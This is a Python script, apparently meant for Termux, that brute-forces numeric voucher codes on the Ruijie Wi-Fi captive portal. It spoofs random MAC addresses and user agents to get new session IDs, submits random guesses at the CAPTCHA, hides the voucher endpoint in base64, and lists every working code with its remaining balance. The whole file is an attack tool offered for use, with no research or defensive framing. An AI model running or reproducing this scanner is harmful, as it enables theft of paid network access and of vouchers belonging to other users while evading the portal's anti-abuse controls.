#!/usr/bin/env python3
import asyncio
import aiohttp
import random
import re
import time
import base64
import sys

# ── CONFIG ──────────────────────────────────────────────────────────────
SESSION_URL = input("🔑 Enter Portal URL: ").strip()
THREADS = 20
BATCH_SIZE = 100
DELAY = 0.1

# ── GLOBALS ──────────────────────────────────────────────────────────────
found_codes = []
checked = 0
stop_scan = False

# ── HELPERS ──────────────────────────────────────────────────────────────

def get_mac():
    return ':'.join(f'{random.randint(0x00, 0xff):02x}' for _ in range(6))

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
]

def random_user_agent():
    return random.choice(USER_AGENTS)

async def get_session_id(sess, session_url, prev_sid=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {'user-agent': random_user_agent(), 'accept': 'text/html'}
    try:
        async with sess.get(url, headers=headers, allow_redirects=True, timeout=5) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return sid.group(1) if sid else prev_sid
    except:
        return prev_sid

async def captcha_image(sess, session_id):
    params = {'sessionId': session_id, '_t': str(time.time())}
    headers = {'user-agent': random_user_agent()}
    try:
        async with sess.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image',
                           params=params, headers=headers, timeout=5) as req:
            return await req.read()
    except:
        return None

async def captcha_text(image_bytes):
    # Random CAPTCHA solver (since ddddocr doesn't work in Termux)
    return ''.join(random.choice('0123456789') for _ in range(4))

async def verify_captcha(sess, session_id, text):
    json_data = {'sessionId': session_id, 'authCode': text}
    headers = {'user-agent': random_user_agent(), 'content-type': 'application/json'}
    try:
        async with sess.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
                            headers=headers, json=json_data, timeout=5) as req:
            data = await req.json()
            return session_id if data.get("success") else None
    except:
        return None

async def get_balance_info(session_id):
    endpoints = [
        f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}",
        f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}",
    ]
    headers = {'user-agent': random_user_agent(), 'accept': 'application/json'}
    async with aiohttp.ClientSession() as temp:
        for url in endpoints:
            try:
                async with temp.get(url, headers=headers, timeout=8) as resp:
                    if resp.status != 200:
                        continue
                    data = await resp.json()
                    if not data.get("success", False):
                        continue
                    result = data.get("result", {})
                    minutes = result.get("totalMinutes") or result.get("remainingMinutes") or 0
                    plan_name = result.get("profileName") or "Unknown"
                    if minutes > 0:
                        return f"📋 {plan_name} | ⏱ {int(minutes)}m"
            except:
                continue
    return "📋 Unknown | ⏱ N/A"

async def perform_check(code, session_url, session_id_cache=None):
    global found_codes
    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()
    
    session_id = session_id_cache
    timeout = aiohttp.ClientTimeout(total=10, connect=3)
    
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar(), timeout=timeout) as sess:
                if not session_id:
                    session_id = await get_session_id(sess, session_url)
                    if not session_id:
                        return None
                
                image = await captcha_image(sess, session_id)
                if not image:
                    return None
                text = await captcha_text(image)
                if not text:
                    return None
                if not await verify_captcha(sess, session_id, text):
                    return None
                
                data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": text}
                headers = {"user-agent": random_user_agent(), "content-type": "application/json", "accept": "*/*"}
                
                async with sess.post(post_url, json=data, headers=headers, timeout=8) as req:
                    response = await req.text()
                    if 'logonUrl' in response:
                        balance = await get_balance_info(session_id)
                        found_codes.append(f"{code} | {balance}")
                        return {"code": code, "balance": balance}
                    elif 'STA' in response:
                        return {"code": code, "status": "limited"}
        except:
            pass
        await asyncio.sleep(0.5)
    return None

def digit_generator(length):
    codes = [str(i).zfill(length) for i in range(10 ** length)]
    random.shuffle(codes)
    for c in codes:
        yield c

async def main():
    global checked, stop_scan
    print("\n" + "=" * 50)
    print("  🔥 RUIJIE SCANNER - TERMUX EDITION")
    print("=" * 50 + "\n")
    
    mode = input("📊 Mode (6/7/8): ").strip()
    if mode not in ["6", "7", "8"]:
        print("❌ Invalid mode!")
        return
    
    total = 10 ** int(mode)
    print(f"\n🚀 Starting scan for {mode}-digit codes...\n")
    
    code_iter = digit_generator(int(mode))
    sem = asyncio.Semaphore(THREADS)
    session_cache = None
    start_time = time.time()
    
    async def _check(code):
        nonlocal session_cache
        async with sem:
            await asyncio.sleep(DELAY)
            result = await perform_check(code, SESSION_URL, session_cache)
            if result and result.get("code"):
                print(f"\n✅ Found: {result['code']} | {result.get('balance', 'N/A')}")
            return result
    
    try:
        while True:
            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break
            
            results = await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
            checked += len(batch)
            
            elapsed = time.time() - start_time
            speed = int((checked / elapsed) * 60) if elapsed > 0 else 0
            progress = min(100, (checked / total) * 100)
            
            sys.stdout.write(f"\r📦 Checked: {checked:,}/{total:,} | 📊 Progress: {progress:.1f}% | ⚡ Speed: {speed}/min | ✅ Found: {len(found_codes)}")
            sys.stdout.flush()
    
    except KeyboardInterrupt:
        print("\n\n⏹️ Stopped by user")
    
    print(f"\n\n🏁 Scan completed! Found: {len(found_codes)} codes")
    if found_codes:
        print("\n✅ Found Codes:")
        for c in found_codes:
            print(f"  {c}")

if __name__ == "__main__":
    asyncio.run(main())
